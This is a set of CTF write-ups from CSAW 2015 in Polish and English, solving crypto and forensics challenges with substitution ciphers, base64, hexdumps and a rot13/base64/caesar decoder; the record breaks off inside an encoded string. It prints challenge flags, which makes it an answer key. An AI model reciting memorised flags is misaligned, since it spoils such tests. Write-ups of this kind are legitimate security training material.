{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/README.md", "content": "# Writeup CSAW CTF 2015\n\nUczestniczyliśmy (msm, Rev, Shalom, other019 i nazywam) w CSAW CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\ninsert lanie_wody into writeup;\n\nOgólne wrażnia:\nKonkurs miał kilka ciekawych zadań, ale jednak troche odbiegał od tego czego można oczekiwać po ctf'ie z prawdziwego zdarzenia. Niektóre zadania opierały się na zgadywaniu tego co autorzy mieli na myśli, w szczególności notesy i airport.\n\ninsert lanie_wody into writeup;\n\nA teraz opisy zadań po kolei.\n\n# Spis treści:\n\n* web 100 K_{Stairs}\n* [Lawn Care Simulator (web 200)](web_200_lawn_care_simulator)\n* [precision (exploit 100)](pwn_100_precision)\n* [FTP 2 (exploit 300)](pwn_300_ftp2)\n* memeshop (exploit 400)\n* [rhinoxorus (exploit 500)](pwn_500_rhinoxorus)\n* [ones_and_zer0es (crypto 50)](crypto_50_ones_and_zer0es)\n* [whiter0se (crypto 50)](crypto_50_wh1ter0se)\n* [zer0-day (crypto 50)](crypto_50_zer0_day)\n* [notesy (crypto 100)](crypto_100_notesy)\n* [Hacking Time (reversing 200)](re_200_hacking_time)\n* [FTP (reversing 300)](re_300_ftp)\n* [wyvern (reversing 500)](re_500_wyvern)\n* [Keep Calm and CTF (forensics 100)](forensics_100_keep_calm_and_ctf)\n* [Transfer (forensics 100)](forensics_100_transfer)\n* [Flash (forensics 100)](forensics_100_flash)\n* [pcapin (forensics 150)](forensics_150_pcapin)\n* [airport (forensics 200)](forensics_200_airport)\n* [sharpturn (forensics 400)](forensics_400_sharpturn)\n* [Julian Cohen (recon 100)](recon_100_julian_cohen)\n* [Alexander Taylor (recon 100)](recon_100_alexander_taylor)\n* [Trivia 1 (trivia 10)](trivia_trivia_1)\n* [Trivia 2 (trivia 10)](trivia_trivia_2)\n* [Trivia 3 (trivia 10)](trivia_trivia_3)\n* [Trivia 4 (trivia 10)](trivia_trivia_4)\n* [Trivia 5 (trivia 10)](trivia_trivia_5)\n* [Math aside, we are all black hats Now (trivia 10)](trivia_10_black_hat)\n\nZadania niedokończone:\n\n* [Weebdate (web 500)](web_500_weebdate)\n\n# Zakończenie\n\ninsert into writeup(content) values lanie_wody;\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:02:57.304781"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/crypto_100_notesy/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/crypto_100_notesy/README.md", "content": "## Notesy (crypto, 100p, 1064 solves)\n`http://54.152.6.70/\nThe flag is not in the flag{} format.\nHINT: If you have the ability to encrypt and decrypt, what do you think the flag is?\nHINT: https://www.youtube.com/watch?v=68BjP5f0ccE`\n\n### PL Version\n`for ENG version scroll down`\n\nPod wskazanym adresem znajduje się strona z textboxem, który szyfruje wpisany text.\n\n![](./notesy.png)\n\nStrona robiła zapytanie GET do skryptu encrypt.php, który jako parametr m przyjmował wiadomość do zaszyfrowania. Placeholder w tekst boksie brzmiał `Give me like a note dude`, javascript odmawiał szyfrowania wiadomości krótszych niż 5 znaków. Próbowaliśmy na prawdę różnych rzeczy, wysyłania wiadomości bardzo krótkich i bardzo długich.\n\nJuż wiecie co jest flagą? My też nie wiedzieliśmy jak ją wydobyć… przez 20 godzin… trzymając ją w rękach…\n\n\nJuż po godzinie od rozpoczęcia konkursu (nie wiemy kiedy zabraliśmy sie za to zadanie) stwierdziliśmy, że zależność między literkami przedstawia się następująco\n\n```\nABCDEFGHIJKLMNOPQRSTUVWXYZ\nUNHMAQWZIDYPRCJKBGVSLOETXF\n```\n\nPróbowaliśmy naprawdę nieschematycznego myślenia, ale nic nie pomogło. Dopiero pierwsza wskazówka przyniosła nam myśl, że flagą musi być klucz, a z racji, że to szyfr podstawieniowy kluczem będzie `UNHMAQWZIDYPRCJKBGVSLOETXF`. Najbardziej frustrujące zadanie z jakim się ostatnio spotkaliśmy.\n\n### ENG Version\n\nWe are given a link to a web page with a textbox which encrypts entered messages.\n\n![](./notesy.png)\n\nThe page was making a GET request to a php script encrypt.php, passing our message as parameter. Placeholder on the main site was `Give me like a note dude`, javascript refuses to encrypt messages shorter than 5 characters. We have tried wide range of various attempts: sending short messages directly to php script, really long messages, but nothing succeeded.\n\nDo you already know now what the flag is? We didn't for about 20 hours… while it was right in front of our eyes…\n\nJust an hour after the contest began (we don't know the exact time when we started to work on this task) we've noticed that dependency between letters is as follows:\n\n```\nABCDEFGHIJKLMNOPQRSTUVWXYZ\nUNHMAQWZIDYPRCJKBGVSLOETXF\n```\nWe tried to think really out of the box, but that didn't help much. The hint helped us a lot (If you have the ability to encrypt and decrypt, what do you think the flag is?) it became clear that the flag is the cipher's key. But because this was a substitution cipher, there was no key per se. So flag could only be `UNHMAQWZIDYPRCJKBGVSLOETXF`. This was the most frustrating challenge we have faced for a very long time.\n", "timestamp": "2025-10-21T22:02:57.550962"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/crypto_50_ones_and_zer0es/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/crypto_50_ones_and_zer0es/README.md", "content": "## ones_and_zer0es (crypto, 50p, 987 solves)\n> [eps1.1_ones-and-zer0es_c4368e65e1883044f3917485ec928173.mpeg](ones-and-zer0es.bin)\n\n### PL Version\n`for ENG version scroll down`\n\nPobieramy wskazany plik. Jego zawartość to:\n\n    01100110011011000110000101110100011110110101000001100101011011110111000001101100011001010010000001100001011011000111011101100001\n    01111001011100110010000001101101011000010110101101100101001000000111010001101000011001010010000001100010011001010111001101110100\n    00100000011001010111100001110000011011000110111101101001011101000111001100101110011111010010000001001001001001110111011001100101\n    00100000011011100110010101110110011001010111001000100000011001100110111101110101011011100110010000100000011010010111010000100000\n    01101000011000010111001001100100001000000111010001101111001000000110100001100001011000110110101100100000011011010110111101110011\n    01110100001000000111000001100101011011110111000001101100011001010010111000100000010010010110011000100000011110010110111101110101\n    00100000011011000110100101110011011101000110010101101110001000000111010001101111001000000111010001101000011001010110110100101100\n    00100000011101110110000101110100011000110110100000100000011101000110100001100101011011010010110000100000011101000110100001100101\n    01101001011100100010000001110110011101010110110001101110011001010111001001100001011000100110100101101100011010010111010001101001\n    01100101011100110010000001100001011100100110010100100000011011000110100101101011011001010010000001100001001000000110111001100101\n    01101111011011100010000001110011011010010110011101101110001000000111001101100011011100100110010101110111011001010110010000100000\n    01101001011011100111010001101111001000000111010001101000011001010110100101110010001000000110100001100101011000010110010001110011\n    00101110\n\nRobimy pierwszą oczywistą rzecz i dekodujemy te bity jako tekst:\n\n    flat{People always make the best exploits.} I've never found it hard to hack most people. If you listen to them, watch them, th2(...)\n\nMamy flagę i 50 punktów\n\n### ENG Version\n\nWe download provided file. Its contents:\n\n    01100110011011000110000101110100011110110101000001100101011011110111000001101100011001010010000001100001011011000111011101100001\n    01111001011100110010000001101101011000010110101101100101001000000111010001101000011001010010000001100010011001010111001101110100\n    00100000011001010111100001110000011011000110111101101001011101000111001100101110011111010010000001001001001001110111011001100101\n    00100000011011100110010101110110011001010111001000100000011001100110111101110101011011100110010000100000011010010111010000100000\n    01101000011000010111001001100100001000000111010001101111001000000110100001100001011000110110101100100000011011010110111101110011\n    01110100001000000111000001100101011011110111000001101100011001010010111000100000010010010110011000100000011110010110111101110101\n    00100000011011000110100101110011011101000110010101101110001000000111010001101111001000000111010001101000011001010110110100101100\n    00100000011101110110000101110100011000110110100000100000011101000110100001100101011011010010110000100000011101000110100001100101\n    01101001011100100010000001110110011101010110110001101110011001010111001001100001011000100110100101101100011010010111010001101001\n    01100101011100110010000001100001011100100110010100100000011011000110100101101011011001010010000001100001001000000110111001100101\n    01101111011011100010000001110011011010010110011101101110001000000111001101100011011100100110010101110111011001010110010000100000\n    01101001011011100111010001101111001000000111010001101000011001010110100101110010001000000110100001100101011000010110010001110011\n    00101110\n\n\nWe start with an obvious approach and we decode given bits as ascii text:\n\n    flat{People always make the best exploits.} I've never found it hard to hack most people. If you listen to them, watch them, th2(...)\n\nWe have the flag and 50 points.", "timestamp": "2025-10-21T22:02:57.823456"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/crypto_50_wh1ter0se/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/crypto_50_wh1ter0se/README.md", "content": "## wh1ter0se (crypto, 50p, 753 solves)\n\n> Note: The flag is the entire thing decrypted\n> [eps1.7_wh1ter0se_2b007cf0ba9881d954e85eb475d0d5e4.m4v](wh1ter0se.bin)\n\n### PL Version\n`for ENG version scroll down`\n\nPobieramy wskazany plik. Jego zawartość to:\n\n    EOY XF, AY VMU M UKFNY TOY YF UFWHYKAXZ EAZZHN. UFWHYKAXZ ZNMXPHN. UFWHYKAXZ\n    EHMOYACOI. VH'JH EHHX CFTOUHP FX VKMY'U AX CNFXY FC OU. EOY VH KMJHX'Y EHHX\n    IFFQAXZ MY VKMY'U MEFJH OU.\n\nNie jest to cezar ani nic podobnego, ale wygląda na jakiś szyfr podstawny. Po chwili kombinowania, postanawiamy wrzucić to do jakiegoś [odpowiedniego solvera](http://quipqiup.com/index.php), z dobrym skutkiem:\n\n    BUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING\n    BEAUTIFUL. WE'VE BEEN FOCUSED ON WHAT'S IN FRONT OF US. BUT WE HAVEN'T BEEN\n    LOOKING AT WHAT'S ABOVE US.\n\nMamy flagę i 50 punktów\n\n### ENG Version\n\nWe download provided file. Its contents:\n\n    EOY XF, AY VMU M UKFNY TOY YF UFWHYKAXZ EAZZHN. UFWHYKAXZ ZNMXPHN. UFWHYKAXZ\n    EHMOYACOI. VH'JH EHHX CFTOUHP FX VKMY'U AX CNFXY FC OU. EOY VH KMJHX'Y EHHX\n    IFFQAXZ MY VKMY'U MEFJH OU.\n\nIt doesn't seem to be a Caesar cipher or anything of this sort, however it does look like a substitution cipher. After a while trying to crack it up we decide to upload the input to an [online cipher solver](http://quipqiup.com/index.php), with good results:\n\n    BUT NO, IT WAS A SHORT CUT TO SOMETHING BIGGER. SOMETHING GRANDER. SOMETHING\n    BEAUTIFUL. WE'VE BEEN FOCUSED ON WHAT'S IN FRONT OF US. BUT WE HAVEN'T BEEN\n    LOOKING AT WHAT'S ABOVE US.\n\nWe have the flag and 50 points.", "timestamp": "2025-10-21T22:02:58.085154"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/crypto_50_zer0_day/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/crypto_50_zer0_day/README.md", "content": "## zer0-day (crypto, 50p, 824 solves)\n\n> [eps1.9_zer0-day_b7604a922c8feef666a957933751a074.avi](zer0-day.bin)\n\n### PL Version\n`for ENG version scroll down`\n\nPobieramy wskazany plik. Jego zawartość to:\n\n    RXZpbCBDb3JwLCB3ZSBoYXZlIGRlbGl2ZXJlZCBvbiBvdXIgcHJvbWlzZSBhcyBleHBlY3RlZC4g\\n\n    VGhlIHBlb3BsZSBvZiB0aGUgd29ybGQgd2hvIGhhdmUgYmVlbiBlbnNsYXZlZCBieSB5b3UgaGF2\\n\n    ZSBiZWVuIGZyZWVkLiBZb3VyIGZpbmFuY2lhbCBkYXRhIGhhcyBiZWVuIGRlc3Ryb3llZC4gQW55\\n\n    IGF0dGVtcHRzIHRvIHNhbHZhZ2UgaXQgd2lsbCBiZSB1dHRlcmx5IGZ1dGlsZS4gRmFjZSBpdDog\\n\n    eW91IGhhdmUgYmVlbiBvd25lZC4gV2UgYXQgZnNvY2lldHkgd2lsbCBzbWlsZSBhcyB3ZSB3YXRj\\n\n    aCB5b3UgYW5kIHlvdXIgZGFyayBzb3VscyBkaWUuIFRoYXQgbWVhbnMgYW55IG1vbmV5IHlvdSBv\\n\n    d2UgdGhlc2UgcGlncyBoYXMgYmVlbiBmb3JnaXZlbiBieSB1cywgeW91ciBmcmllbmRzIGF0IGZz\\n\n    b2NpZXR5LiBUaGUgbWFya2V0J3Mgb3BlbmluZyBiZWxsIHRoaXMgbW9ybmluZyB3aWxsIGJlIHRo\\n\n    ZSBmaW5hbCBkZWF0aCBrbmVsbCBvZiBFdmlsIENvcnAuIFdlIGhvcGUgYXMgYSBuZXcgc29jaWV0\\n\n    eSByaXNlcyBmcm9tIHRoZSBhc2hlcyB0aGF0IHlvdSB3aWxsIGZvcmdlIGEgYmV0dGVyIHdvcmxk\\n\n    LiBBIHdvcmxkIHRoYXQgdmFsdWVzIHRoZSBmcmVlIHBlb3BsZSwgYSB3b3JsZCB3aGVyZSBncmVl\\n\n    ZCBpcyBub3QgZW5jb3VyYWdlZCwgYSB3b3JsZCB0aGF0IGJlbG9uZ3MgdG8gdXMgYWdhaW4sIGEg\\n\n    d29ybGQgY2hhbmdlZCBmb3JldmVyLiBBbmQgd2hpbGUgeW91IGRvIHRoYXQsIHJlbWVtYmVyIHRv\\n\n    IHJlcGVhdCB0aGVzZSB3b3JkczogImZsYWd7V2UgYXJlIGZzb2NpZXR5LCB3ZSBhcmUgZmluYWxs\\n\n    eSBmcmVlLCB3ZSBhcmUgZmluYWxseSBhd2FrZSF9Ig==\n\nNa pierwszy rzut oka to base64, wystarczy go zdekodować (pamiętając żeby \"\\n\" nie traktowąc literalnie tylko wyciąć)\n\n    Evil Corp, we have delivered on our promise as expected. The people of the\n    world who have been enslaved by you have been freed. Your financial data has\n    been destroyed. Any attempts to salvage it will be utterly futile. Face it: you\n    have been owned. We at fsociety will smile as we watch you and your dark souls\n    die. That means any money you owe these pigs has been forgiven by us, your\n    friends at fsociety. The market's opening bell this morning will be the final\n    death knell of Evil Corp. We hope as a new society rises from the ashes that\n    you will forge a better world. A world that values the free people, a world\n    where greed is not encouraged, a world that belongs to us again, a world\n    changed forever. And while you do that, remember to repeat these words:\n    \"flag{We are fsociety, we are finally free, we are finally awake!}\"\n\nMamy flagę i 50 punktów\n\n### ENG Version\n\nWe download provided file. Its contents:\n\n    RXZpbCBDb3JwLCB3ZSBoYXZlIGRlbGl2ZXJlZCBvbiBvdXIgcHJvbWlzZSBhcyBleHBlY3RlZC4g\\n\n    VGhlIHBlb3BsZSBvZiB0aGUgd29ybGQgd2hvIGhhdmUgYmVlbiBlbnNsYXZlZCBieSB5b3UgaGF2\\n\n    ZSBiZWVuIGZyZWVkLiBZb3VyIGZpbmFuY2lhbCBkYXRhIGhhcyBiZWVuIGRlc3Ryb3llZC4gQW55\\n\n    IGF0dGVtcHRzIHRvIHNhbHZhZ2UgaXQgd2lsbCBiZSB1dHRlcmx5IGZ1dGlsZS4gRmFjZSBpdDog\\n\n    eW91IGhhdmUgYmVlbiBvd25lZC4gV2UgYXQgZnNvY2lldHkgd2lsbCBzbWlsZSBhcyB3ZSB3YXRj\\n\n    aCB5b3UgYW5kIHlvdXIgZGFyayBzb3VscyBkaWUuIFRoYXQgbWVhbnMgYW55IG1vbmV5IHlvdSBv\\n\n    d2UgdGhlc2UgcGlncyBoYXMgYmVlbiBmb3JnaXZlbiBieSB1cywgeW91ciBmcmllbmRzIGF0IGZz\\n\n    b2NpZXR5LiBUaGUgbWFya2V0J3Mgb3BlbmluZyBiZWxsIHRoaXMgbW9ybmluZyB3aWxsIGJlIHRo\\n\n    ZSBmaW5hbCBkZWF0aCBrbmVsbCBvZiBFdmlsIENvcnAuIFdlIGhvcGUgYXMgYSBuZXcgc29jaWV0\\n\n    eSByaXNlcyBmcm9tIHRoZSBhc2hlcyB0aGF0IHlvdSB3aWxsIGZvcmdlIGEgYmV0dGVyIHdvcmxk\\n\n    LiBBIHdvcmxkIHRoYXQgdmFsdWVzIHRoZSBmcmVlIHBlb3BsZSwgYSB3b3JsZCB3aGVyZSBncmVl\\n\n    ZCBpcyBub3QgZW5jb3VyYWdlZCwgYSB3b3JsZCB0aGF0IGJlbG9uZ3MgdG8gdXMgYWdhaW4sIGEg\\n\n    d29ybGQgY2hhbmdlZCBmb3JldmVyLiBBbmQgd2hpbGUgeW91IGRvIHRoYXQsIHJlbWVtYmVyIHRv\\n\n    IHJlcGVhdCB0aGVzZSB3b3JkczogImZsYWd7V2UgYXJlIGZzb2NpZXR5LCB3ZSBhcmUgZmluYWxs\\n\n    eSBmcmVlLCB3ZSBhcmUgZmluYWxseSBhd2FrZSF9Ig==\n\nAt the first glance it looks like a base64 encoding, we only need to decode it (keeping in mind to cut out \"\\n\" characters)\n\n    Evil Corp, we have delivered on our promise as expected. The people of the\n    world who have been enslaved by you have been freed. Your financial data has\n    been destroyed. Any attempts to salvage it will be utterly futile. Face it: you\n    have been owned. We at fsociety will smile as we watch you and your dark souls\n    die. That means any money you owe these pigs has been forgiven by us, your\n    friends at fsociety. The market's opening bell this morning will be the final\n    death knell of Evil Corp. We hope as a new society rises from the ashes that\n    you will forge a better world. A world that values the free people, a world\n    where greed is not encouraged, a world that belongs to us again, a world\n    changed forever. And while you do that, remember to repeat these words:\n    \"flag{We are fsociety, we are finally free, we are finally awake!}\"\n\nWe have the flag and 50 points.", "timestamp": "2025-10-21T22:02:58.332492"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_100_flash/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_100_flash/README.md", "content": "## Flash (forensics, 100p, 809 solves)\n`We were able to grab an image of a hard drive. Time to find out what's on it.`.\n\n### PL Version\n`for ENG version scroll down`\n\nDostajemy 128MB obraz dysku.\nNie myśleliśmy nawet o tym, żeby go montować, bo spodziewaliśmy się pustego dysku (pisząc writeup pokusiliśmy się o to i się nieźle zdziwilismy ). Pierwszą rzeczą jaka przyszła nam do głowy był `photorec`, który nie znalazł nic ciekawego, dlatego wykonalismy `strings flash_c8429a430278283c0e571baebca3d139.img | grep flag`.\n\nDostajemy flagę `flag{b3l0w_th3_r4dar}`.\n\n### ENG Version\n\n128MB disk image was provided.\nWe were expecting it to be completly empty, so we didn't even bother mounting it (we actually tried that while writing this writeup and it turned out there were a lot of text files, which was a great suprise). So according to the standard procedure, we tried using `photorec`,\nbut it did not find any images, so we executed `strings flash_c8429a430278283c0e571baebca3d139.img | grep flag`.\n\nThe last line of grep output was: `flag{b3l0w_th3_r4dar}`.\n", "timestamp": "2025-10-21T22:02:58.612053"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_100_keep_calm_and_ctf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_100_keep_calm_and_ctf/README.md", "content": "## Keep Calm and CTF (forensics, 100p, 1064 solves)\n`My friend sends me pictures before every ctf. He told me this one was special.\nNote: this flag doesn't follow the \"flag{}\" format`\n\n![](./kc&ctf.jpg)\n\n### PL Version\n`for ENG version scroll down`\n\nPierwszą rzeczą jaką robimy w takich sytuacjach jest przejrzenie hexdumpu, tak na wszelki wypadek. Może na końcu jest dopisany jeszcze jeden plik np. .zip albo .png z flagą. Zrobiliśmy to poleceniem `xxd img.jpg | less`.\n\n```\n0000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H\n0000010: 0048 0000 ffe1 0058 4578 6966 0000 4d4d  .H.....XExif..MM\n0000020: 002a 0000 0008 0003 0128 0003 0000 0001  .*.......(......\n0000030: 0002 0000 0213 0003 0000 0001 0001 0000  ................\n0000040: 8298 0002 0000 001d 0000 0032 0000 0000  ...........2....\n0000050: 6831 6431 6e67 5f69 6e5f 346c 6d30 7374  h1d1ng_in_4lm0st\n0000060: 5f70 6c61 316e 5f73 6967 6837 0000 ffdb  _pla1n_sigh7....\n```\n\nI mamy następną flagę.\n\n### ENG Version\n\nThe first thing we do in similar cases is to look inside the hexdump of the file, just in case. Sometimes there can be another file appended or\narchive with flag. We did it with  `xxd img.jpg | less`.\n\n```\n0000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H\n0000010: 0048 0000 ffe1 0058 4578 6966 0000 4d4d  .H.....XExif..MM\n0000020: 002a 0000 0008 0003 0128 0003 0000 0001  .*.......(......\n0000030: 0002 0000 0213 0003 0000 0001 0001 0000  ................\n0000040: 8298 0002 0000 001d 0000 0032 0000 0000  ...........2....\n0000050: 6831 6431 6e67 5f69 6e5f 346c 6d30 7374  h1d1ng_in_4lm0st\n0000060: 5f70 6c61 316e 5f73 6967 6837 0000 ffdb  _pla1n_sigh7....\n```\nSo we got another one.\n", "timestamp": "2025-10-21T22:02:58.846439"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/forensics_100_transfer/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/forensics_100_transfer/README.md", "content": "## Transfer (forensics, 100p, 541 solves)\n\n### PL\n[ENG](#eng-version)\n\n> I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.  \n> [net_756d631588cb0a400cc16d1848a5f0fb.pcap](transfer.pcap)\n\nPobrany plik pcap ładujemy do Wiresharka żeby po chwili przeglądania transmisji HTTP (menu File -> Export Objects -> HTTP) znaleźć następujący kod źródłowy programu:\n\n```python\nimport string\nimport random\nfrom base64 import b64encode, b64decode\n\nFLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'\n\nenc_ciphers = ['rot13', 'b64e', 'caesar']\n# dec_ciphers = ['rot13', 'b64d', 'caesard']\n\ndef rot13(s):\n\t_rot13 = string.maketrans( \n    \t\"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz\", \n    \t\"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm\")\n\treturn string.translate(s, _rot13)\n\ndef b64e(s):\n\treturn b64encode(s)\n\ndef caesar(plaintext, shift=3):\n    alphabet = string.ascii_lowercase\n    shifted_alphabet = alphabet[shift:] + alphabet[:shift]\n    table = string.maketrans(alphabet, shifted_alphabet)\n    return plaintext.translate(table)\n\ndef encode(pt, cnt=50):\n\ttmp = '2{}'.format(b64encode(pt))\n\tfor cnt in xrange(cnt):\n\t\tc = random.choice(enc_ciphers)\n\t\ti = enc_ciphers.index(c) + 1\n\t\t_tmp = globals()[c](tmp)\n\t\ttmp = '{}{}'.format(i, _tmp)\n\n\treturn tmp\n\nif __name__ == '__main__':\n\tprint encode(FLAG, cnt=?)\n```\n\nW tej samej transmisji (opcja Follow TCP Stream) była również zakodowana wiadomość.\n\nPo odwróceniu wszystkich algorytmów otrzymujemy taki program dekodujący:\n\n```python\nimport string\nimport random\nfrom base64 import b64encode, b64decode\n\nFLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'\n\n#enc_ciphers = ['rot13', 'b64e', 'caesar']\ndec_ciphers = ['rot13', 'b64d', 'caesard']\n\ndef rot13(s):\n\t_rot13 = string.maketrans( \n    \t\"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz\", \n    \t\"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm\")\n\treturn string.translate(s, _rot13)\n\ndef b64d(s):\n\treturn b64decode(s)\n\ndef caesard(plaintext, shift=-3):\n    alphabet = string.ascii_lowercase\n    shifted_alphabet = alphabet[shift:] + alphabet[:shift]\n    table = string.maketrans(alphabet, shifted_alphabet)\n    return plaintext.translate(table)\n\ndef encode(pt, cnt=50):\n\ttmp = '2{}'.format(b64encode(pt))\n\tfor cnt in xrange(cnt):\n\t\tc = random.choice(enc_ciphers)\n\t\ti = enc_ciphers.index(c) + 1\n\t\t_tmp = globals()[c](tmp)\n\t\ttmp = '{}{}'.format(i, _tmp)\n\n\treturn tmp\n\ndef decode(pt, cnt=61):\n    for i in xrange(cnt):\n        c = pt[0]\n        if c == '1':\n            pt = rot13(pt[1:])\n        if c == '2':\n            pt = b64d(pt[1:])\n        if c == '3':\n            pt = caesard(pt[1:])\n\n    print pt\n\nif __name__ == '__main__':\n    x = '2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVGs1U2IyODFXa1ZuTUZadU1YVldiVkphVFVaS1dGWXlkbUZXTVdkMVprWnJWMlZHYzFsWGJscHVVekpOWVZaeFZsUmxWMnR5VkZabU5HaFdaM1pYY0hkdVRXOWFSMVJXYTA5V1YwcElhRVpTVm1WSGExUldWbHBrWm05dk5sSnZVbXhTVm5OWVZtNW1NV1l4V1dGVWJscFVaWEJoVjFsdVdtUm5iMUpYVjNGS2IxWlViMWhXVnpFd1YwWktkbVpGWVZkbFIxRXdWa1JHVDJZeFRuWlhjRzlUWlZkclkxWlhZVk5TYmpGSFZsaHJaRkpVYjFOWmJsVXhWakZTVjFkd09WaFNNRlkyVmxjMVIxWldXa1pUY0d0WFpVWnpZbHBYWVhwVFYwWkhWM0JyVG1Wd2EydFdjSE5MVFVkSllsWnVaMWRsYm5OWldWUk9VMlV4VWxkWGJuZFVWbTl6V0Zad2QyNWtWbHAxVGxabldsWldWV0ZXYmxwTFZqRk9kV1pHYTJ0a01YTlpWbGN4WTJoR1NsZGxNM05yVW00MVdGbFVUa05OVmxwWVprVk9iV1ZXUmpWV2NIZHlaRzlLV0doRk9WVldjRkpVVm5CaFZtaEdaM1ZuUm1kVFpHTldXRlp3TVhwVk1XZDNVMjl2Vm1ReVVsWldiMmRUVlVaV2RGSndkMjFsU0VKSFZHOWFibFV4V25oUmJqRlhWak5yV0ZSdVdsTldNVko0Vm05T2EwMXdhMVpXY0dGdVpURlJZVmR4VWs5V1ZUVllWWEIzWkZkR2JucFdjSGRYWlZWYVlsWXlkalZXY0VwSFYzRmFWV1ZHY3pOWk1tRlhabkJLU0dSRk5WZE5WWE5JVm05U1IxWXlUblZOVm1kVVpXNWFWVmxVUm1SVU1WbDZWbkZhVGxKd1VsbFpNRlp1VlhCS1JrNVZiMXBOUjJ0TVdWY3hTMmRIVmtaYVJtZHJaREJ6Y2xaVVJtUldjRlpJVTI1YVdHUmpWbFZWYjFwNlVtOWFWMWR2WjJ4bFZrWTFWWEExUzFkSFJXSmtSazVYWlZock0xbFZXbVJXTWtaSlZHOVdVMlF6UW1SWFYzZFhaekZaZWsxVldsaGxSa3BYVkZablUxTkdXa2hvUm1kWFRWWktNVlp3WVhKa1ZrcFlaMk5DVjFaRmNucGFSRUV4VTBaYWRtUkdVbXhsVjJ0WVYxY3hORmxXWjFkV2NVcFhaVlJXVUZad1lYcFNNVnAyWkVkM1YyUmpSa2xXVjNkeVZuQkdkVkpVUWxWV00ydFFWbkF4UjFKV1ZuZGtSMnRPWlZaRllsWXhVa2RsTVZsaVZXOXJWMlZ2V2xoWlZFSjZabFp2VlZOd09VOVNiMWt5VlZjMVMyUXdNVlpPVlc5YVRVZFNTRlpVUVdGU01WcFpaRVphYkZkRlNrMVdSbHBrVkRGYWRsZHhSbFZsUmxwUFZtMUdTMU5XWjNaV2IxcHZVbTV6WTFVeGEzWlZNa1Y2WmtaQ1ZtVkhVVEJWWTBaYWFGZE9SbFJ2Vmxka1kxWktWakozWkdVeFdrZFhjVXB0VWxSV1pGbHVXbVJuVm5ORlVuRmFiMUp2U2pCVmNHRnVWVEF3WVZOdU5WZFdSVzVoV1cxQllWTkdTbmhXYjBwWVVqTnJXRlpHV21SWlZrNVhWVzluVjJWdU5WaFVWM2Q2VFZadWVsVnVaMWhTYjNOWVdYRnpTMWxXU25abVNFcFdUWEZPTkZVd1dsTm1NWE5IVkhCclRtVndhMUZXY0RCaFRrZFJZVlZ1WjJ0Tk1sSnlWVzlyVTJZeFduWmFSRkpYVm5CaFlWVlhNRFZXUjBwSWFFWnZWVTFXYzJ0V1ZFWmtaMGRHUlZKdloydE5iMFl6VmxoelIxTXhXbGRUY1VwWVpWZHJjMWxVUm5wV2IxbGhWVzVuV2xZeFNsaFdjRFZYVlRKS1IyWkdWbFpsUjFKMFdsVmFVMVp2V25kU2JqbFhaR05XV0ZZeWQzSmtNVnAzVTNGS1ZHVndhMlJVVlZwNlZVWldkMmhIZDIxbFIxSmpWa2RoVTFZd01YZGtSV3RYVmtWS2VWWnRRVEZTTVZaMlpVZHJVMUpWYzNsWFZsSlBaREExZGxadloxWmxWVnBVVkZabk5GWXhVV0ZXY1U1WFZtNXpXbFZYTlVkV2NFWjFVMjluWkZKRldsQldNRnBYWjFaYWRscEdUbGRTVm5Oa1ZuQnpTMDVHV1dKU2NVNVdaREZ6V1ZsdVZucFdNVkpYV2taT1QxSnZTbGRXY0hOVFpERktkV1ZqU2xaTlZrcElWbkIyWVZJeFduUlZiM05PVm05dk0xWlhNVFJXTWxKWVUyNXJiMUl6UWxSVmIxWjZWRVphZEZKd2MwNVdiM05qVm05cmNsWndSV05SYjJkVlZqTk9ORlJ2V2xkbU1rWklUMVU1VjJReWVtTldiMlpoWlRKR2RsZFlhMVJrTTBKV1ZtOW5jbWh2V2xWU2JuZHRUVlp6TUZrd1dsTlZNV2RJWkVWaFYyVllRbEJaYlVwVFowWmFkVmR3YjFOV01VcGhWMWN3WVdVeFJXRlhXR2RYWlZSdlQxUldXbGROTVc1NlZuQkdiRkp1YnpOVWIxcDJWbTR4UjFOdVVsWk5WMUpIV2tSR1YyWndUa2hvUm1kVFpESTVORll5WVc1TlJsbDZUbGhPVkdWdlduSlZibFprVjBaU1ZtUkZUbFJsUmxZMFZqSXhNRlV5U2taTlZGcFdaVVpLVEZZd1owdFNNVTUxV2taelYxWXlhMDFXVkVadVZERmFkbFZ4U2xSbFJrcFVWbkJoZWxkV1dsaG1SV2RYVFZaS1lsUnZXbVJYUm1kSWFFWlNWMl